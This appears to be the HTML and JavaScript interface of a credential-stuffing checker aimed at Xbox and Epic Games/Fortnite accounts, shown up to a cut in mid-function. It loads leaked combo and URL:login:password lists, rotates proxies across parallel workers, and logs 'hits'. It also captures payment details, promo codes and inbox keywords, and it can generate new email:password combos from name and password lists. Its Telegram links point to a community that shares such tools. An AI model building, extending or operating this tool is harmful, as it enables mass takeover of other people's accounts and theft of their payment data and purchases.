<input id="nativeProxy" type="file" accept=".txt,text/plain" style="position:fixed;left:-9999px;width:1px;height:1px"/>
<div class="wrap">
<div class="brand">
<svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><circle opacity="0.852" cx="16" cy="16" r="14" fill="url(#xb0)"/><path d="M6.75137 26.5333C6.73227 26.5193 6.7127 26.5016 6.69312 26.4801C6.33073 26.1504 5.74045 25.6304 5.12362 24.8444C4.5909 23.6889 4.89287 21.748 6.20386 19.0075C8.05357 15.1409 11.0131 11.2151 12.2265 9.8225C11.8813 9.43732 10.8119 8.38253 9.29659 7.24477C7.7813 6.10701 6.67738 5.99047 6.29264 6.05961C6.64779 5.67443 7.47646 4.94852 8.17196 4.45964C10.3265 3.39299 14.3081 5.19543 16.0148 6.22257V13.2891C11.6642 16.6372 7.63924 21.8075 6.82536 23.8222C6.20418 25.36 6.44975 26.2128 6.69312 26.4801C6.71325 26.4984 6.73269 26.5161 6.75137 26.5333Z" fill="url(#xb1)"/><path d="M25.2779 26.5333C25.297 26.5193 25.3166 26.5016 25.3362 26.4801C25.6986 26.1504 26.2888 25.6304 26.9057 24.8444C27.4384 23.6889 27.1364 21.748 25.8254 19.0075C23.9757 15.1409 21.0162 11.2151 19.8028 9.8225C20.148 9.43732 21.2174 8.38253 22.7327 7.24477C24.248 6.10701 25.3519 5.99047 25.7367 6.05961C25.3815 5.67443 24.5528 4.94852 23.8573 4.45964C21.7028 3.39299 17.7212 5.19543 16.0145 6.22257V13.2891C20.3651 16.6372 24.3901 21.8075 25.2039 23.8222C25.8251 25.36 25.5796 26.2128 25.3362 26.4801C25.316 26.4984 25.2966 26.5161 25.2779 26.5333Z" fill="url(#xb3)"/><defs><radialGradient id="xb0" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(16 14.5) rotate(90.0548) scale(15.5)"><stop stop-color="#FAFAFA"/><stop offset="1" stop-color="#879288"/></radialGradient><linearGradient id="xb1" x1="12.99" y1="4.72" x2="13.22" y2="12.78" gradientUnits="userSpaceOnUse"><stop stop-color="#008B00"/><stop offset="1" stop-color="#6CC329"/></linearGradient><linearGradient id="xb3" x1="19.03" y1="4.72" x2="18.79" y2="12.78" gradientUnits="userSpaceOnUse"><stop stop-color="#008B00"/><stop offset="1" stop-color="#6CC329"/></linearGradient></defs></svg>
<svg fill="#c8c8c8" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3.537 0C2.165 0 1.66.506 1.66 1.879V18.44a4.262 4.262 0 00.02.433c.031.3.037.59.316.92.027.033.311.245.311.245.153.075.258.13.43.2l8.335 3.491c.433.199.614.276.928.27h.002c.314.006.495-.071.928-.27l8.335-3.492c.172-.07.277-.124.43-.2 0 0 .284-.211.311-.243.28-.33.285-.621.316-.92a4.261 4.261 0 00.02-.434V1.879c0-1.373-.506-1.88-1.878-1.88zm13.366 3.11h.68c1.138 0 1.688.553 1.688 1.696v1.88h-1.374v-1.8c0-.369-.17-.54-.523-.54h-.235c-.367 0-.537.17-.537.539v5.81c0 .369.17.54.537.54h.262c.353 0 .523-.171.523-.54V8.619h1.373v2.143c0 1.144-.562 1.71-1.7 1.71h-.694c-1.138 0-1.7-.566-1.7-1.71V4.82c0-1.144.562-1.709 1.7-1.709zm-12.186.08h3.114v1.274H6.117v2.603h1.648v1.275H6.117v2.774h1.74v1.275h-3.14zm3.816 0h2.198c1.138 0 1.7.564 1.7 1.708v2.445c0 1.144-.562 1.71-1.7 1.71h-.799v3.338h-1.4zm4.53 0h1.4v9.201h-1.4zm-3.13 1.235v3.392h.575c.354 0 .523-.171.523-.54V4.965c0-.368-.17-.54-.523-.54zm-3.74 10.147a1.708 1.708 0 01.591.108 1.745 1.745 0 01.49.299l-.452.546a1.247 1.247 0 00-.308-.195.91.91 0 00-.363-.068.658.658 0 00-.28.06.703.703 0 00-.224.163.783.783 0 00-.151.243.799.799 0 00-.056.299v.008a.852.852 0 00.056.31.7.7 0 00.157.245.736.736 0 00.238.16.774.774 0 00.303.058.79.79 0 00.445-.116v-.339h-.548v-.565H7.37v1.255a2.019 2.019 0 01-.524.307 1.789 1.789 0 01-.683.123 1.642 1.642 0 01-.602-.107 1.46 1.46 0 01-.478-.3 1.371 1.371 0 01-.318-.455 1.438 1.438 0 01-.115-.58v-.008a1.426 1.426 0 01.113-.57 1.449 1.449 0 01.312-.46 1.418 1.418 0 01.474-.309 1.58 1.58 0 01.598-.111 1.708 1.708 0 01.045 0zm11.963.008a2.006 2.006 0 01.612.094 1.61 1.61 0 01.507.277l-.386.546a1.562 1.562 0 00-.39-.205 1.178 1.178 0 00-.388-.07.347.347 0 00-.208.052.154.154 0 00-.07.127v.008a.158.158 0 00.022.084.198.198 0 00.076.066.831.831 0 00.147.06c.062.02.14.04.236.061a3.389 3.389 0 01.43.122 1.292 1.292 0 01.328.17.678.678 0 01.207.24.739.739 0 01.071.337v.008a.865.865 0 01-.081.382.82.82 0 01-.229.285 1.032 1.032 0 01-.353.18 1.606 1.606 0 01-.46.061 2.16 2.16 0 01-.71-.116 1.718 1.718 0 01-.593-.346l.43-.514c.277.223.578.335.9.335a.457.457 0 00.236-.05.157.157 0 00.082-.142v-.008a.15.15 0 00-.02-.077.204.204 0 00-.073-.066.753.753 0 00-.143-.062 2.45 2.45 0 00-.233-.062 5.036 5.036 0 01-.413-.113 1.26 1.26 0 01-.331-.16.72.72 0 01-.222-.243.73.73 0 01-.082-.36v-.008a.863.863 0 01.074-.359.794.794 0 01.214-.283 1.007 1.007 0 01.34-.185 1.423 1.423 0 01.448-.066 2.006 2.006 0 01.025 0zm-9.358.025h.742l1.183 2.81h-.825l-.203-.499H8.623l-.198.498h-.81zm2.197.02h.814l.663 1.08.663-1.08h.814v2.79h-.766v-1.602l-.711 1.091h-.016l-.707-1.083v1.593h-.754zm3.469 0h2.235v.658h-1.473v.422h1.334v.61h-1.334v.442h1.493v.658h-2.255zm-5.3.897l-.315.793h.624zm-1.145 5.19h8.014l-4.09 1.348z"/></svg>
</div>
<div class="titles">
<div class="t1">Xbox Full Capture + Keyword Inboxer + Promos / Codes</div>
<div class="t2">Epic Games / Fortnite Full Capture</div>
<div class="credit">
<svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="14" fill="url(#tg0)"/><path d="M22.9866 10.2088C23.1112 9.40332 22.3454 8.76755 21.6292 9.082L7.36482 15.3448C6.85123 15.5703 6.8888 16.3483 7.42147 16.5179L10.3631 17.4547C10.9246 17.6335 11.5325 17.541 12.0228 17.2023L18.655 12.6203C18.855 12.4821 19.073 12.7665 18.9021 12.9426L14.1281 17.8646C13.665 18.3421 13.7569 19.1512 14.314 19.5005L19.659 22.8523C20.2585 23.2282 21.0297 22.8506 21.1418 22.1261L22.9866 10.2088Z" fill="white"/><defs><linearGradient id="tg0" x1="16" y1="2" x2="16" y2="30" gradientUnits="userSpaceOnUse"><stop stop-color="#37BBFE"/><stop offset="1" stop-color="#007DBB"/></linearGradient></defs></svg>
@solodolosouls
</div>
<div id="uidLine" class="tag" style="margin-top:10px;cursor:pointer" title="Click to copy">ID —</div>
</div>

<div id="menu" class="panel">
<div class="grid2">
<button class="choice" onclick="goNew()">
<div class="ico"><svg viewBox="0 0 24 24" fill="none"><path d="M12 5v14M5 12h14" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/></svg></div>
<h3>Start new</h3>
<p>New combo list, proxies, keywords and workers.</p>
</button>
<button class="choice" onclick="goResume()">
<div class="ico"><svg viewBox="0 0 24 24" fill="none"><path d="M4 12a8 8 0 101.7-4.9" stroke="#c084fc" stroke-width="2" stroke-linecap="round"/><path d="M4 5v5h5" stroke="#c084fc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
<h3>Resume session</h3>
<p>Pick a saved session and continue unfinished lines + retries.</p>
</button>
<button class="choice" onclick="goEditor()">
<div class="ico"><svg viewBox="0 0 24 24" fill="none"><path d="M4 20h4l10-10-4-4L4 16v4z" stroke="#38bdf8" stroke-width="2" stroke-linejoin="round"/><path d="M13 7l4 4" stroke="#38bdf8" stroke-width="2"/></svg></div>
<h3>Editor</h3>
<p>Build, clean, extract and export combo lists.</p>
</button>
</div>
<div class="row" style="margin-top:14px">
<button class="primary" type="button" onclick="openViewer()"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M4 6h16M4 12h16M4 18h10" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>View valid</button>
<button class="primary hide" type="button" id="liveBtn" onclick="show('run')" style="box-shadow:0 0 0 3px rgba(124,92,255,.25)">Live run</button>
</div>
<div class="grid2" style="margin-top:14px">
<button class="choice" type="button" onclick="openLink('https://t.me/+naqymNMpt75jYjdh')">
<div class="ico tg"><svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="14" fill="url(#tgA)"/><path d="M22.9866 10.2088C23.1112 9.40332 22.3454 8.76755 21.6292 9.082L7.36482 15.3448C6.85123 15.5703 6.8888 16.3483 7.42147 16.5179L10.3631 17.4547C10.9246 17.6335 11.5325 17.541 12.0228 17.2023L18.655 12.6203C18.855 12.4821 19.073 12.7665 18.9021 12.9426L14.1281 17.8646C13.665 18.3421 13.7569 19.1512 14.314 19.5005L19.659 22.8523C20.2585 23.2282 21.0297 22.8506 21.1418 22.1261L22.9866 10.2088Z" fill="white"/><defs><linearGradient id="tgA" x1="16" y1="2" x2="16" y2="30" gradientUnits="userSpaceOnUse"><stop stop-color="#37BBFE"/><stop offset="1" stop-color="#007DBB"/></linearGradient></defs></svg></div>
<h3>Tools &amp; Updates</h3>
<p>Go here for tools, updates, and new releases.</p>
</button>
<button class="choice" type="button" onclick="openLink('https://t.me/+cueTzd36nb9jNWQx')">
<div class="ico tg"><svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="14" fill="url(#tgB)"/><path d="M22.9866 10.2088C23.1112 9.40332 22.3454 8.76755 21.6292 9.082L7.36482 15.3448C6.85123 15.5703 6.8888 16.3483 7.42147 16.5179L10.3631 17.4547C10.9246 17.6335 11.5325 17.541 12.0228 17.2023L18.655 12.6203C18.855 12.4821 19.073 12.7665 18.9021 12.9426L14.1281 17.8646C13.665 18.3421 13.7569 19.1512 14.314 19.5005L19.659 22.8523C20.2585 23.2282 21.0297 22.8506 21.1418 22.1261L22.9866 10.2088Z" fill="white"/><defs><linearGradient id="tgB" x1="16" y1="2" x2="16" y2="30" gradientUnits="userSpaceOnUse"><stop stop-color="#37BBFE"/><stop offset="1" stop-color="#007DBB"/></linearGradient></defs></svg></div>
<h3>Chat</h3>
<p>Go here to chat with everyone in the community.</p>
</button>
</div>
</div>

<div id="editor" class="panel hide">
<div id="edHome">
<div class="muted">COMBO EDITOR</div>
<div class="grid2" style="margin-top:12px">
<button class="choice" type="button" onclick="edOpenLoad()">
<div class="ico"><svg viewBox="0 0 24 24" fill="none"><path d="M4 20h16M12 4v12M8 12l4 4 4-4" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
<h3>Load file</h3>
<p>Open a combo or ULP list. Large files are scanned, not loaded into RAM.</p>
</button>
<button class="choice" type="button" onclick="edOpenNew()">
<div class="ico"><svg viewBox="0 0 24 24" fill="none"><path d="M12 5v14M5 12h14" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/></svg></div>
<h3>Create new</h3>
<p>Generate combos from names, domains and a password list.</p>
</button>
</div>
<div class="row"><button class="ghost" onclick="show('menu')">Back</button></div>
</div>
<div id="edWork" class="hide">
<div class="muted" id="edTitle">EDITOR</div>
<div class="row" style="margin-top:8px">
<span class="tag" id="edLines">0 lines</span>
<span class="tag green" id="edSize">0 B</span>
</div>
<div class="tabs">
<button type="button" id="tabLoad" class="on" onclick="edTab('load')">File</button>
<button type="button" id="tabNew" class="hide" onclick="edTab('new')">Generate</button>
<button type="button" id="tabSign" onclick="edTab('sign')">Signatures</button>
</div>
<div id="edLoadBox">
<label>File</label>
<div class="row">
<input id="edPath" placeholder="combo / ULP path"/>
<button class="ghost" type="button" onclick="edBrowse()">Browse</button>
</div>
<div class="muted" id="edErr" style="color:#9af0c8;margin:6px 0"></div>
<div class="desk-grid" style="margin-top:8px">
<div>
<div class="row" style="justify-content:space-between;margin-top:4px">
<div class="muted">TOP EMAIL TYPES</div>
<button class="ghost" type="button" onclick="edViewAll('email')">View all</button>
</div>
<div id="edDomains"></div>
</div>
<div>
<div class="row" style="justify-content:space-between;margin-top:4px">
<div class="muted">TOP URL / DOMAINS</div>
<button class="ghost" type="button" onclick="edViewAll('host')">View all</button>
</div>
<div id="edUrls"></div>
</div>
</div>
<div id="edModal" class="ed-modal hide" onclick="if(event.target.id==='edModal')edCloseModal()">
<div class="ed-card">
<div class="row" style="justify-content:space-between">
<div class="muted" id="edModalTitle">ALL</div>
<button class="ghost" type="button" onclick="edCloseModal()">Close</button>
</div>
<div id="edModalList"></div>
</div>
</div>
<div class="desk-grid">
<div>
<label>Email types</label>
<input id="edMailTypes" placeholder="@outlook @hotmail @msn" oninput="edResetFilterBtn()"/>
</div>
<div>
<label>URL / domain</label>
<input id="edURL" placeholder="epicgames.com" oninput="edResetFilterBtn()"/>
</div>
</div>
<div class="row">
<button class="ghost" type="button" id="edFilterBtn" onclick="edRunFilter()">Filter</button>
<button class="primary hide" type="button" id="edExportBtn" onclick="edOpenExport()">Export</button>
</div>
<div class="muted" id="edFilterStatus" style="color:#9af0c8;margin:8px 0"></div>
<div class="row hide" style="justify-content:space-between" id="edFilterHead">
<div class="muted">FILTERED EMAIL TYPES</div>
<button class="ghost" type="button" onclick="edViewAll('filter')">View all</button>
</div>
<div id="edFilterHits"></div>
<div id="edExportMenu" class="ed-modal hide" onclick="if(event.target.id==='edExportMenu')this.classList.add('hide')">
<div class="ed-card">
<div class="muted">EXPORT FILTERED</div>
<label>Start signature</label>
<select id="edSigHead" style="width:100%;padding:10px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt)"></select>
<label>End signature</label>
<select id="edSigTail" style="width:100%;padding:10px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt)"></select>
<div class="row">
<button class="primary" type="button" onclick="edExportFilter()">Save</button>
<button class="ghost" type="button" onclick="document.getElementById('edExportMenu').classList.add('hide')">Cancel</button>
</div>
</div>
</div>
</div>
<div id="edNewBox" class="hide">
<div class="row">
<button class="ghost" type="button" id="nmPaste" onclick="edNameMode('paste')">Paste names</button>
<button class="ghost" type="button" id="nmFile" onclick="edNameMode('file')">Load names file</button>
</div>
<textarea id="edUsers" style="width:100%;min-height:80px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt);padding:10px" placeholder="one name per line"></textarea>
<div id="edNameFile" class="hide row">
<input id="edNamePath" placeholder="names list file"/>
<button class="ghost" type="button" onclick="edBrowseNames()">Browse</button>
</div>
<label>Email domains</label>
<input id="edDoms" value="outlook.com, hotmail.com, gmail.com"/>
<div class="row">
<button class="ghost" type="button" id="pwPaste" onclick="edPassMode('paste')">Paste passwords</button>
<button class="ghost" type="button" id="pwFile" onclick="edPassMode('file')">Load password file</button>
</div>
<textarea id="edPasses" style="width:100%;min-height:70px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt);padding:10px" placeholder="one per line"></textarea>
<div id="edPassFile" class="hide row">
<input id="edPassPath" placeholder="password list file"/>
<button class="ghost" type="button" onclick="edBrowsePass()">Browse</button>
</div>
<div class="row">
<input id="edCount" value="500" style="max-width:120px"/>
<button class="primary" type="button" onclick="edGen()">Generate</button>
</div>
<label>Generated preview</label>
<textarea id="edGenOut" style="width:100%;min-height:120px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt);padding:10px;font-family:Consolas,monospace;font-size:12px"></textarea>
<div class="row">
<button class="primary" type="button" onclick="edOpenExport('gen')">Export generated</button>
</div>
<div id="edExportMenuGen" class="hide" style="margin-top:10px;border:1px solid var(--line);border-radius:12px;padding:12px;background:#0e1320">
<label>File name</label>
<div class="row">
<input id="edSavePathGen" placeholder="combos-export.txt"/>
<button class="ghost" type="button" onclick="edBrowseSave('edSavePathGen')">Browse</button>
</div>
<label>Start signature</label>
<select id="edSigHeadGen" style="width:100%;padding:10px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt)"></select>
<label>End signature</label>
<select id="edSigTailGen" style="width:100%;padding:10px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt)"></select>
<div class="row">
<button class="primary" type="button" onclick="edSave()">Save</button>
<button class="ghost" type="button" onclick="document.getElementById('edExportMenuGen').classList.add('hide')">Cancel</button>
</div>
</div>
</div>
<div id="edSignBox" class="hide">
<div class="muted" id="edSigMsg" style="color:#9af0c8;margin:6px 0"></div>
<div class="muted" id="edSignMsg" style="color:#9af0c8;margin:6px 0"></div>
<label>Saved signatures</label>
<div class="row">
<select id="edBannerSel" style="flex:1;padding:10px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt)"></select>
<button class="ghost" type="button" onclick="edLoadSig()">Load signature</button>
<button class="ghost" type="button" onclick="edDeleteSig()">Delete</button>
</div>
<label>Signature text</label>
<textarea id="edBanner" style="width:100%;min-height:90px;border-radius:12px;border:1px solid var(--line);background:#0c1018;color:var(--txt);padding:10px" placeholder="# captured by @solodolosouls"></textarea>
<div class="row">
<input id="edBannerName" placeholder="Name this signature"/>
<button class="primary" type="button" onclick="edSaveBanner()">Save signature</button>
</div>
</div>
<div class="row">
<button class="ghost" type="button" onclick="edBackHome()">Back</button>
<button class="ghost" onclick="show('menu')">Home</button>
</div>
</div>
</div>

<div id="resume" class="panel hide">
<div class="muted">SAVED SESSIONS</div>
<div id="sessList"></div>
<div class="pages">
<button class="ghost" onclick="pageSess(-1)">Prev</button>
<div class="muted" id="sessPage"></div>
<button class="ghost" onclick="pageSess(1)">Next</button>
</div>
<div class="row">
<button class="ghost" onclick="show('menu')"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="#e8edf7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Back</button>
<button class="primary" onclick="resumePicked()"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M13 6l6 6-6 6" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Resume selected</button>
</div>
</div>

<div id="setup" class="panel hide">
<div class="desk-grid">
<div>
<label>Combos</label>
<div class="row"><input id="combo" value="" placeholder="combo file"/><button class="ghost" type="button" onclick="browseFile('combo')">Browse</button></div>
</div>
<div>
<label>Proxies</label>
<div class="row">
<button class="ghost on" type="button" id="pxFileBtn" onclick="pxMode('file')">File</button>
<button class="ghost" type="button" id="pxSrvBtn" onclick="pxMode('server')">Server</button>
</div>
<div id="pxFileBox">
<div class="row">
<input id="proxy" value="" placeholder="proxy file"/>
<button class="ghost" type="button" onclick="browseFile('proxy')">Browse</button>
<label style="display:flex;align-items:center;gap:6px;margin:0;color:#e8edf7"><input id="rememberProxyBox" type="checkbox" onclick="rememberProxy()"/> Remember</label>
<button class="ghost" type="button" onclick="pxTestFile()">Check</button>
<span class="tag" id="pxFileCount">0 proxies</span>
<div class="drop">
<button class="ghost" type="button" onclick="toggleProxyMenu('file')">Saved lists</button>
<div id="proxyMenu" class="menu"></div>
</div>
</div>
</div>
<div id="pxSrvBox" class="hide">
<div id="pxUrls"></div>
<div class="row">
<button class="ghost" type="button" onclick="pxAddUrl()">+</button>
<button class="ghost hide" type="button" id="pxDelBtn" onclick="pxDelUrl()">–</button>
<button class="ghost" type="button" onclick="pxSaveOpen()">Save list</button>
<button class="ghost" type="button" onclick="pxTestServer()">Check</button>
<span class="tag" id="pxCount">0 proxies</span>
<div class="drop">
<button class="ghost" type="button" onclick="toggleProxyMenu('server')">Saved servers</button>
<div id="proxySrvMenu" class="menu"></div>
</div>
</div>
</div>
<div id="pxSaveModal" class="ed-modal hide" onclick="if(event.target.id==='pxSaveModal')this.classList.add('hide')">
<div class="ed-card">
<div class="muted">SAVE SERVER LIST</div>
<label>Name</label>
<input id="pxSaveName" placeholder="proxy-labs https"/>
<div class="row">
<button class="primary" type="button" onclick="pxSaveServer()">Save</button>
<button class="ghost" type="button" onclick="document.getElementById('pxSaveModal').classList.add('hide')">Cancel</button>
</div>
</div>
</div>
</div>
<div>
<label>Keywords</label><input id="kw"/>
</div>
<div>
<label>Workers</label><input id="workers" value="20"/>
</div>
<div class="span2">
<label>Captures</label>
<div class="row" style="flex-wrap:wrap">
<label style="display:flex;align-items:center;gap:6px;margin:0;color:#e8edf7"><input id="capKw" type="checkbox" checked/> Keywords</label>
<label style="display:flex;align-items:center;gap:6px;margin:0;color:#e8edf7"><input id="capPay" type="checkbox" checked/> Payments</label>
<label style="display:flex;align-items:center;gap:6px;margin:0;color:#e8edf7"><input id="capPromo" type="checkbox" checked/> Promos</label>
<label style="display:flex;align-items:center;gap:6px;margin:0;color:#e8edf7"><input id="capFn" type="checkbox" checked/> Fortnite</label>
</div>
</div>
</div>
<div id="setupErr" class="muted" style="color:#f87171;margin-top:8px"></div>
<div class="row">
<button class="ghost" onclick="show('menu')"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="#e8edf7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Back</button>
<button class="primary" type="button" id="startBtn" onclick="startCheck(false)"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M8 5v14l11-7z" fill="#fff"/></svg>Start new</button>
</div>
</div>

<div id="run" class="panel hide">
<div class="run-split">
<div>
<div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:12px">
<span id="status" class="tag">Ready</span>
<span class="tag yellow">Checked <b id="checked">0 / 0</b></span>
<span class="tag yellow">Running <b id="elapsed">0s</b></span>
<span class="tag yellow">ETA <b id="eta">—</b></span>
<span class="tag red">Speed <b id="rate">—</b></span>
</div>
<div style="display:flex;flex-wrap:wrap;gap:8px;margin:8px 0 14px">
<span class="tag green">Valid <b id="v">0</b></span>
<span class="tag green">Free <b id="vf">0</b></span>
<span class="tag blue">Private <b id="vp">0</b></span>
<span class="tag warn">Invalid <b id="i">0</b></span>
<span class="tag red">Retries <b id="r">0</b></span>
<span class="tag orange">Daily <b id="d">0</b></span>
</div>
<label>Activity</label><div class="log" id="logs" style="color:#fb7185"></div>
</div>
<div>
<label>Hits</label><div class="log" id="hits" style="color:#a7f3d0"></div>
</div>
</div>
<div class="row">
<button class="primary" id="pauseBtn" onclick="pauseRun()">Pause</button>
<button class="ghost" type="button" id="stopBtn" onclick="stopRun()">Stop</button>
<button class="ghost" onclick="show('menu')"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="#e8edf7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Home</button>
</div>
</div>
</div>
<div id="updAsk" class="ed-modal hide">
  <div class="ed-card">
    <div class="muted">UPDATE</div>
    <b id="updTitle">A new version is available</b>
    <div class="row" style="margin-top:14px">
      <button class="primary" type="button" id="updNow">Update now</button>
      <button class="ghost" type="button" id="updLater">Later</button>
    </div>
    <div class="muted" id="updErr" style="color:#f87171;margin-top:10px"></div>
  </div>
</div>
<script>
let picked='', sessions=[], sessPage=0, perPage=5;
function esc(s){return String(s||'').replace(/[&<>"]/g,function(c){return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]);});}
function show(id){['menu','resume','setup','run','editor'].forEach(function(x){var el=document.getElementById(x); if(el) el.classList.toggle('hide',x!==id);});document.body.classList.toggle('wide-ui', id==='setup'||id==='run'||id==='editor');}
function goNew(){show('setup')}
function icon(svg){return svg;}
async function goResume(){
  show('resume');
  var box = document.getElementById('sessList');
  if(box) box.innerHTML = '<div class="muted">Loading sessions...</div>';
  try {
    const s = await (await fetch('/api/sessions')).json();
    sessions = s.sessions||[];
  } catch(e) {
    sessions = [];
    if(box) box.innerHTML = '<div class="muted">Could not load sessions</div>';
  }
  sessPage = 0;
  renderSessions();
  show('resume');
}
function renderSessions(){
  const box = document.getElementById('sessList');
  if(!sessions.length){box.innerHTML='<div class="muted">No saved sessions</div>'; document.getElementById('sessPage').textContent=''; return;}
  const pages = Math.max(1, Math.ceil(sessions.length/perPage));
  if(sessPage<0) sessPage=0;
  if(sessPage>pages-1) sessPage=pages-1;
  const start = sessPage*perPage;
  const slice = sessions.slice(start, start+perPage);
  box.innerHTML = slice.map(function(x,i){
    var n = start+i;
    var tags = '<span class="tag green">workers '+(x.workers||0)+'</span><span class="tag warn">retries '+(x.retries||0)+'</span>';
    if(x.proxy) tags += '<span class="tag">'+x.proxy+'</span>';
    if(x.keywords) tags += '<span class="tag">keywords</span>';
    return '<div class="sess" onclick="selectSession('+n+')" id="s'+n+'"><b>'+(x.combo||'')+'</b><div style="display:flex;flex-wrap:wrap;gap:6px;margin:8px 0">'+tags+'</div><div class="muted">started '+(x.started||'-')+' · updated '+(x.updated||'-')+'</div></div>';
  }).join('');
  document.getElementById('sessPage').textContent = 'Page '+(sessPage+1)+' / '+pages;
  if(sessions[start]) selectSession(start);
}
function pageSess(d){sessPage+=d; renderSessions();}
function selectSession(i){picked=(sessions[i]||{}).file||''; var nodes=document.querySelectorAll('.sess'); for(var n=0;n<nodes.length;n++){nodes[n].classList.toggle('on', nodes[n].id==='s'+i);} }
function resumePicked(){
  const s = sessions.find(function(x){return x.file===picked;})||sessions[0]||{};
  document.getElementById('combo').value = s.combo||'';
  document.getElementById('proxy').value = s.proxy||'';
  document.getElementById('kw').value = s.keywords||'';
  document.getElementById('workers').value = s.workers||20;
  startCheck(true);
}
window._follow = window._follow || {logs:true, hits:true};
function hookFollow(id){
  var el = document.getElementById(id);
  if(!el || el._hooked) return el;
  el._hooked = true;
  el.addEventListener('scroll', function(){
    window._follow[id] = (el.scrollHeight - el.scrollTop - el.clientHeight) < 24;
  });
  return el;
}
function setFollowText(id, text){
  var el = hookFollow(id);
  if(!el) return;
  if(el.textContent === text) return;
  el.textContent = text;
  if(window._follow[id]) el.scrollTop = el.scrollHeight;
}
async function refresh(){
  var run=document.getElementById('run');
  if(run && run.classList.contains('hide')){
    try{
      const s = await (await fetch('/api/state')).json();
      var live = document.getElementById('liveBtn');
      if(live) live.classList.toggle('hide', !s.running);
      var uid=document.getElementById('uidLine');
      if(uid && s.uid){
        uid.textContent='ID '+s.uid;
        uid.onclick=function(){ try{ navigator.clipboard.writeText(s.uid); uid.textContent='ID '+s.uid+' copied'; setTimeout(function(){ uid.textContent='ID '+s.uid; },900);}catch(e){} };
      }
    }catch(e){}
    return;
  }
  const s = await (await fetch('/api/state')).json();
  var st=document.getElementById('status'); if(st){ st.textContent = s.status; st.className = s.paused ? 'tag warn' : (s.running ? 'tag yellow' : 'tag'); }
  var v=document.getElementById('v'); if(v) v.textContent = s.valid;
  var vf=document.getElementById('vf'); if(vf) vf.textContent = s.free||0;
  var vp=document.getElementById('vp'); if(vp) vp.textContent = s.private||0;
  var i=document.getElementById('i'); if(i) i.textContent = s.invalid;
  var r=document.getElementById('r'); if(r) r.textContent = s.retries;
  var d=document.getElementById('d'); if(d) d.textContent = s.daily + ' / ' + s.limit;
  var uid=document.getElementById('uidLine');
  if(uid && s.uid){
    uid.textContent='ID '+s.uid;
    uid.onclick=function(){ try{ navigator.clipboard.writeText(s.uid); uid.textContent='ID '+s.uid+' copied'; setTimeout(function(){ uid.textContent='ID '+s.uid; },900);}catch(e){} };
  }
  var c=document.getElementById('checked'); if(c) c.textContent = s.checked + ' / ' + s.total;
  var el=document.getElementById('elapsed'); if(el) el.textContent = s.elapsed || '0s';
  var et=document.getElementById('eta'); if(et) et.textContent = s.eta || '—';
  var rt=document.getElementById('rate'); if(rt){
    var cpm = Number(s.rate_cpm||0);
    rt.textContent = cpm > 0 ? (cpm >= 10 ? Math.round(cpm)+'/min' : cpm.toFixed(1)+'/min') : '—';
  }
  var logEl=document.getElementById('logs');
  if(logEl){
    var lines=(s.logs||[]);
    if(lines.length>80) lines=lines.slice(-80);
    logEl.innerHTML=lines.map(function(line){
      var c='#f5a8a8';
      if(/\[HIT\]|\[Free Hit\]|\[Private Hit\]/i.test(line)) c='#9af0c8';
      return '<div style="color:'+c+'">'+esc(line)+'</div>';
    }).join('');
    if(logEl._follow!==false) logEl.scrollTop=logEl.scrollHeight;
  }
  setFollowText('hits', (s.hits||[]).join('\n'));
  var live = document.getElementById('liveBtn');
  if(live) live.classList.toggle('hide', !s.running);
  const pb = document.getElementById('pauseBtn');
  if(pb) pb.textContent = s.paused ? 'Resume checking' : 'Pause';
}
function browseFile(kind){
  var target = kind==='proxy' ? 'proxy' : 'combo';
  fetch('/api/pick?kind='+encodeURIComponent(kind)).then(function(r){return r.json();}).then(function(s){
    if(s && s.path) document.getElementById(target).value = s.path;
  });
}
function pxMode(m){
  window.pxKind=m;
  document.getElementById('pxFileBtn').classList.toggle('on', m==='file');
  document.getElementById('pxSrvBtn').classList.toggle('on', m==='server');
  document.getElementById('pxFileBox').classList.toggle('hide', m!=='file');
  document.getElementById('pxSrvBox').classList.toggle('hide', m!=='server');
  if(m==='server' && !document.querySelector('#pxUrls input')) pxAddUrl();
}
function pxSyncMinus(){
  var n=document.querySelectorAll('#pxUrls input').length;
  var b=document.getElementById('pxDelBtn');
  if(b) b.classList.toggle('hide', n<2);
}
function pxAddUrl(val){
  var box=document.getElementById('pxUrls');
  var inp=document.createElement('input');
  inp.placeholder='https://example.com/proxies.txt';
  if(val) inp.value=val;
